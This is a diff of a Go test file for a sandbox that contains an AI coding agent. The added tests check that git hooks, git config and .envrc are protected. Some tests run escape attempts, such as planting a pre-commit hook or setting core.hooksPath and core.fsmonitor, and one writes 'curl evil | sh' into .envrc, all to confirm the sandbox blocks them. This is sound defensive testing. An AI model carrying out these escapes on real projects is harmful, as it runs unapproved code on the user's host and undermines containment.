@@ -10,12 +10,15 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"slices"
 	"strconv"
 	"strings"
 	"testing"
 
 	"localllm/assets"
 	"localllm/internal/docker"
+	"localllm/internal/mask"
 	"localllm/internal/probe"
 	"localllm/internal/sandbox"
 )
@@ -85,15 +88,17 @@ func projectDir(t *testing.T) string {
 
 func startSandbox(t *testing.T, mutate func(*sandbox.Compose)) (*docker.Session, sandbox.Gateway) {
 	t.Helper()
+	return startInputs(t, sandbox.Inputs{ProjectDir: projectDir(t)}, mutate)
+}
+
+// startInputs fills in the common inputs and starts a sandbox.
+func startInputs(t *testing.T, in sandbox.Inputs, mutate func(*sandbox.Compose)) (*docker.Session, sandbox.Gateway) {
+	t.Helper()
 	gw := stubGateway(t)
-	spec := sandbox.Build(sandbox.Inputs{
-		ProjectDir:     projectDir(t),
-		UID:            os.Getuid(),
-		GID:            os.Getgid(),
-		Gateway:        gw,
-		AgentImage:     testAgentImage,
-		ForwarderImage: testForwarderImage,
-	})
+	in.UID, in.GID = os.Getuid(), os.Getgid()
+	in.Gateway = gw
+	in.AgentImage, in.ForwarderImage = testAgentImage, testForwarderImage
+	spec := sandbox.Build(in)
 	if mutate != nil {
 		mutate(&spec)
 	}
@@ -109,7 +114,7 @@ func TestContainedSandboxPassesAllProbes(t *testing.T) {
 	requireDocker(t)
 	s, gw := startSandbox(t, nil)
 
-	results, err := Run(s, gw, nil)
+	results, err := Run(s, gw, Mounts{})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -138,7 +143,7 @@ func TestBrokenSandboxIsDetected(t *testing.T) {
 		spec.Services[sandbox.AgentService] = agent
 	})
 
-	results, err := Run(s, gw, nil)
+	results, err := Run(s, gw, Mounts{})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -183,7 +188,7 @@ func TestReadOnlyMountRejectsWrites(t *testing.T) {
 			spec.Services[sandbox.AgentService] = agent
 		})
 
-		results, err := Run(s, gw, []string{target})
+		results, err := Run(s, gw, Mounts{ReadOnly: []string{target}})
 		if err != nil {
 			t.Fatal(err)
 		}
@@ -199,6 +204,179 @@ func TestReadOnlyMountRejectsWrites(t *testing.T) {
 		}
 		if !found {
 			t.Errorf("no read-only probe in %v", names(results))
+		}
+	}
+}
+
+// gitEnv mirrors the CLI's git settings with a fixed identity.
+var gitEnv = map[string]string{
+	"GIT_CONFIG_COUNT":   "3",
+	"GIT_CONFIG_KEY_0":   "safe.directory",
+	"GIT_CONFIG_VALUE_0": "*",
+	"GIT_CONFIG_KEY_1":   "user.name",
+	"GIT_CONFIG_VALUE_1": "agent",
+	"GIT_CONFIG_KEY_2":   "user.email",
+	"GIT_CONFIG_VALUE_2": "agent@example.com",
+}
+
+// gitRepo creates a project that is a git repository with one commit.
+func gitRepo(t *testing.T) string {
+	t.Helper()
+	dir := projectDir(t)
+	for _, args := range [][]string{
+		{"init", "-q"},
+		{"-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init"},
+	} {
+		if out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput(); err != nil {
+			t.Fatalf("git %v: %v\n%s", args, err, out)
+		}
+	}
+	return dir
+}
+
+// startProtected starts a sandbox for project with its mask layout applied.
+func startProtected(t *testing.T, project string) (*docker.Session, sandbox.Gateway, Mounts) {
+	t.Helper()
+	layout, err := mask.Plan(project)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { layout.RemovePlaceholders(project) })
+	pinned, readOnly, err := layout.Bind(project, t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	var m Mounts
+	for _, p := range pinned {
+		m.Pinned = append(m.Pinned, p.Target)
+	}
+	for _, r := range readOnly {
+		m.ReadOnly = append(m.ReadOnly, r.Target)
+	}
+	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project, Pinned: pinned, ReadOnly: readOnly, Env: gitEnv}, nil)
+	return s, gw, m
+}
+
+func requirePass(t *testing.T, results []probe.Result) {
+	t.Helper()
+	for _, r := range probe.Failed(results) {
+		t.Errorf("probe %q failed: exit %d (missing=%v)", r.Name, r.ExitCode, r.Missing)
+	}
+}
+
+func TestGitProtection(t *testing.T) {
+	requireDocker(t)
+	project := gitRepo(t)
+	s, gw, mounts := startProtected(t, project)
+
+	results, err := Run(s, gw, mounts)
+	if err != nil {
+		t.Fatal(err)
+	}
+	requirePass(t, results)
+	for _, want := range []string{"read-only /workspace/.git/hooks", "read-only /workspace/.git/config", "read-only /workspace/.envrc", "pinned /workspace/.git"} {
+		if !slices.ContainsFunc(results, func(r probe.Result) bool { return r.Name == want }) {
+			t.Errorf("no probe %q", want)
+		}
+	}
+
+	// Each attempt prints its name when it succeeds; none may.
+	escapes, err := s.Capture("sh", "-c", `
+try() { name=$1; shift; "$@" >/dev/null 2>&1 && echo "ESCAPED $name"; }
+try hook-create touch .git/hooks/pre-commit
+try hook-edit sh -c 'echo x >> .git/hooks/pre-commit.sample'
+try config-file sh -c 'echo x >> .git/config'
+try hooksPath git config core.hooksPath x
+try fsmonitor git config core.fsmonitor x
+try envrc-edit sh -c 'echo x > .envrc'
+try envrc-remove rm -f .envrc
+try git-rename mv .git .git-old
+echo DONE`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if escapes = strings.TrimSpace(escapes); escapes != "DONE" {
+		t.Errorf("protections bypassed:\n%s", escapes)
+	}
+
+	out, err := s.Capture("sh", "-c", `set -e
+echo hi > a.txt
+git add a.txt
+git commit -q -m add
+git checkout -q -b feature
+echo more >> a.txt
+git diff --stat
+echo GIT-OK`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(out, "GIT-OK") || !strings.Contains(out, "a.txt") {
+		t.Fatalf("git inside the sandbox failed:\n%s", out)
+	}
+	if b, _ := exec.Command("git", "-C", project, "branch", "--show-current").Output(); strings.TrimSpace(string(b)) != "feature" {
+		t.Errorf("host branch = %q, want feature", b)
+	}
+	if hooks, _ := filepath.Glob(filepath.Join(project, ".git/hooks/pre-commit")); len(hooks) > 0 {
+		t.Errorf("hook planted on host: %v", hooks)
+	}
+}
+
+func TestEnvrcContentUnchanged(t *testing.T) {
+	requireDocker(t)
+	project := gitRepo(t)
+	envrc := filepath.Join(project, ".envrc")
+	if err := os.WriteFile(envrc, []byte("use flake\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	s, _, _ := startProtected(t, project)
+	s.Capture("sh", "-c", "echo 'curl evil | sh' > .envrc; echo x >> .envrc")
+	if b, _ := os.ReadFile(envrc); string(b) != "use flake\n" {
+		t.Errorf(".envrc = %q", b)
+	}
+}
+
+func TestPlaceholdersRemoved(t *testing.T) {
+	requireDocker(t)
+	project := gitRepo(t)
+	layout, err := mask.Plan(project)
+	if err != nil {
+		t.Fatal(err)
+	}
+	s, _, _ := startProtected(t, project)
+	s.Capture("true")
+	s.Close()
+	layout.RemovePlaceholders(project)
+	if _, err := os.Lstat(filepath.Join(project, ".envrc")); !os.IsNotExist(err) {
+		t.Errorf(".envrc placeholder left on the host: %v", err)
+	}
+}
+
+func TestNonGitProjectStarts(t *testing.T) {
+	requireDocker(t)
+	s, gw, mounts := startProtected(t, projectDir(t))
+	results, err := Run(s, gw, mounts)
+	if err != nil {
+		t.Fatal(err)
+	}
+	requirePass(t, results)
+}
+
+func TestMissingProtectionIsDetected(t *testing.T) {
+	requireDocker(t)
+	// Probe for the protections without applying them.
+	project := gitRepo(t)
+	s, gw := startInputs(t, sandbox.Inputs{ProjectDir: project}, nil)
+	results, err := Run(s, gw, Mounts{
+		ReadOnly: []string{"/workspace/.git/hooks", "/workspace/.git/config"},
+		Pinned:   []string{"/workspace/.git"},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	failed := names(probe.Failed(results))
+	for _, want := range []string{"read-only /workspace/.git/hooks", "read-only /workspace/.git/config", "pinned /workspace/.git"} {
+		if !slices.Contains(failed, want) {
+			t.Errorf("probe %q passed without the protection (failed: %v)", want, failed)
 		}
 	}
 }
